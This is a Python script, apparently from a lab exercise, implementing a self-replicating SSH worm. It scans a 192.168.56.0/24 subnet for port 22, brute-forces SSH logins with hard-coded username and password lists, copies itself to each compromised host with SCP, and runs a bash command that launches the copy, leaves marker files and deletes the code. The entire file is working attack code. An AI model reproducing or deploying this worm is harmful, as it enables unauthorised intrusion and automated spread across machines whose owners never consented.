#! /usr/bin/env python3
import nmap
import paramiko
import sys
from scp import SCPClient

#defining the variable that calls the port scanner function : nmap
nmScan = nmap.PortScanner()
#defining the local subnet and the target port
nmScan.scan('192.168.56.0/24', '22')
#initializing cmd line method
nmScan.command_line()
#defining a list for the hosts on the subnet
networkhosts = []

#looping through all of the hosts, adding them to the list
for host in nmScan.all_hosts():
    networkhosts.append(host)
print(networkhosts)

#for loop to define the host variable and the wordlists used for brute forcing the password
for element in networkhosts:
    host = element
    port = 22
    usernames = ['sam','gavin','stephen','devin']
    #usernames = /usr/share/wordlists/rockyou.txt
    passwords = ['admin','stephen','penelope','password']
    #passwords = /usr/share/wordlists/rockyou.txt

    #for host in subnet, try various user and password combinations to brute force ssh login to the target devices.
    for user in usernames:
        for pword in passwords:
            username = user
            password = pword
            #bash code: execute the self-replica, create tracks, delete code once execution complete
            command = "if [ ! -f .WormyIsHiding ]; then touch .WormyIsHiding && touch 'WormyWuzHere' && echo 'Haha no code for you :)' > WormyWuzHere && ./WormyTheWorm 2> /tmp/output.log; fi && rm -f WormyTheWorm"   
            #initializing paramiko ssh client by defining the ssh variable
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                #try to connect to ssh with a user and password combo
                ssh.connect(host, port, username, password, timeout=5)
                scp = SCPClient(ssh.get_transport())
                #transport python code onto target
                scp.put(sys.argv[0])
                #execute bash commands on target machine
                stdin, stdout, stderr = ssh.exec_command(command)
                print(host + ' Success :)')
            except:
                #if the login attempt fails, print timeout
                print(host + ' Timeout :(')
